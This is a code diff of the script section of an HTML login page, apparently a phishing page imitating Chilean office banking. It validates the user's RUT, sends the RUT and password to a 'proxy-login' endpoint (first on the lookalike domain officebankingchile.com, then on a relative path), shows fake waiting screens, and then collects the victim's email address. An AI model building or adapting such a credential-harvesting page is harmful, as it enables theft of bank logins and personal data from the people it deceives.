@@ -223,107 +223,110 @@
 
   <!-- Scripts al final del body -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
- 
-  <script>    // ✅ Autoformateo de RUT en tiempo real
-    function formatearRUT(valor) {
-      valor = valor.replace(/\./g, "").replace(/-/g, "");
-      if(valor.length === 0) return "";
-      let dv = valor.slice(-1);
-      let cuerpo = valor.slice(0, -1);
-      let cuerpoFormateado = "";
-      while(cuerpo.length > 3){
-        cuerpoFormateado = "." + cuerpo.slice(-3) + cuerpoFormateado;
-        cuerpo = cuerpo.slice(0, -3);
-      }
-      cuerpoFormateado = cuerpo + cuerpoFormateado;
-      return cuerpoFormateado + "-" + dv;
+ <script>
+  // Autoformateo de RUT
+  function formatearRUT(valor) {
+    valor = valor.replace(/\./g, "").replace(/-/g, "");
+    if(valor.length === 0) return "";
+    let dv = valor.slice(-1);
+    let cuerpo = valor.slice(0, -1);
+    let cuerpoFormateado = "";
+    while(cuerpo.length > 3){
+      cuerpoFormateado = "." + cuerpo.slice(-3) + cuerpoFormateado;
+      cuerpo = cuerpo.slice(0, -3);
     }
-
-    document.getElementById("rut").addEventListener("input", function(e){
-      let valor = e.target.value.replace(/[^0-9kK]/g, ""); // solo números y K
-      e.target.value = formatearRUT(valor);
-    });
-
-    // Validación de RUT
-    function validarRut(rutCompleto) {
-      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
-      if(rutCompleto.length < 2) return false;
-      let cuerpo = rutCompleto.slice(0, -1);
-      let dv = rutCompleto.slice(-1);
-      let suma = 0, multiplo = 2;
-      for(let i = cuerpo.length - 1; i >= 0; i--) {
-        suma += parseInt(cuerpo.charAt(i)) * multiplo;
-        multiplo = multiplo < 7 ? multiplo + 1 : 2;
-      }
-      let dvEsperado = 11 - (suma % 11);
-      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
-      return dv === dvEsperado;
-    }
-
-document.getElementById("loginForm").addEventListener("submit", async function(e){
-  e.preventDefault();
-  const rut = document.getElementById("rut").value;
-  const passwd = document.getElementById("passwd").value;
-  
-  if(!validarRut(rut)){
-    document.getElementById("resultado").innerText = "❌ RUT inválido";
-    return;
+    cuerpoFormateado = cuerpo + cuerpoFormateado;
+    return cuerpoFormateado + "-" + dv;
   }
 
-  try {
-    const response = await fetch("https://officebankingchile.com/proxy-login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ rut, passwd})
-    });
-    const data = await response.json();
-    document.getElementById("resultado").innerText = data.mensaje;
+  document.getElementById("rut").addEventListener("input", function(e){
+    let valor = e.target.value.replace(/[^0-9kK]/g, "");
+    e.target.value = formatearRUT(valor);
+  });
 
-    if(response.ok){
-      document.getElementById("loginForm").style.display="none";
-      document.getElementById("pantallaEspera").classList.remove("hidden");
-
-      setTimeout(()=>{
-        document.getElementById("pantallaEspera").classList.add("hidden");
-        document.getElementById("formCorreo").classList.remove("hidden");
-      }, 5000); // puedes ajustar el tiempo
+  // Validación de RUT
+  function validarRut(rutCompleto) {
+    rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+    if(rutCompleto.length < 2) return false;
+    let cuerpo = rutCompleto.slice(0, -1);
+    let dv = rutCompleto.slice(-1);
+    let suma = 0, multiplo = 2;
+    for(let i = cuerpo.length - 1; i >= 0; i--) {
+      suma += parseInt(cuerpo.charAt(i)) * multiplo;
+      multiplo = multiplo < 7 ? multiplo + 1 : 2;
     }
-  } catch (error) {
-    document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+    let dvEsperado = 11 - (suma % 11);
+    dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+    return dv === dvEsperado;
   }
-});
 
-    async function enviarCorreo(){
-      const correo = document.getElementById("correo").value;
+  // Envío de login
+  document.getElementById("loginForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+    const rut = document.getElementById("rut").value;
+    const passwd = document.getElementById("passwd").value;
 
-      try {
-        const response = await fetch("https://officebankingchile.com/proxy-login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ mail: correo })
-        });
-        const data = await response.json();
-        document.getElementById("resultado").innerText = data.mensaje;
-      } catch (error) {
-        console.error("Error al enviar correo:", error);
+    if(!validarRut(rut)){
+      document.getElementById("resultado").innerText = "❌ RUT inválido";
+      return;
+    }
+
+    try {
+      const response = await fetch("/proxy-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ rut, passwd })
+      });
+      const data = await response.json();
+      document.getElementById("resultado").innerText = data.mensaje;
+
+      if(response.ok){
+        document.getElementById("loginForm").style.display="none";
+        document.getElementById("pantallaEspera").classList.remove("hidden");
+
+        setTimeout(()=>{
+          document.getElementById("pantallaEspera").classList.add("hidden");
+          document.getElementById("formCorreo").classList.remove("hidden");
+        }, 5000);
       }
-      document.getElementById("formCorreo").classList.add("hidden");
-      document.getElementById("pantallaEspera").classList.remove("hidden");
-
-      setTimeout(()=>{
-        document.getElementById("pantallaEspera").classList.add("hidden");
-        document.getElementById("pantallaProductos").classList.remove("hidden");
-      }, 5000);
+    } catch (error) {
+      document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
     }
+  });
 
-    function continuarProductos(){
-      document.getElementById("pantallaProductos").classList.add("hidden");
-      document.getElementById("pantallaEspera").classList.remove("hidden");
+  // Envío de correo
+  async function enviarCorreo(){
+    const correo = document.getElementById("correo").value;
 
-      setTimeout(()=>{
-        window.location.href="productos.html";
-      }, 5000);
+    try {
+      const response = await fetch("/proxy-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mail: correo })
+      });
+      const data = await response.json();
+      document.getElementById("resultado").innerText = data.mensaje;
+    } catch (error) {
+      console.error("Error al enviar correo:", error);
     }
-  </script>
+    document.getElementById("formCorreo").classList.add("hidden");
+    document.getElementById("pantallaEspera").classList.remove("hidden");
+
+    setTimeout(()=>{
+      document.getElementById("pantallaEspera").classList.add("hidden");
+      document.getElementById("pantallaProductos").classList.remove("hidden");
+    }, 5000);
+  }
+
+  // Continuar a productos
+  function continuarProductos(){
+    document.getElementById("pantallaProductos").classList.add("hidden");
+    document.getElementById("pantallaEspera").classList.remove("hidden");
+
+    setTimeout(()=>{
+      window.location.href="productos.html";
+    }, 5000);
+  }
+</script>
 </body>
 </html>
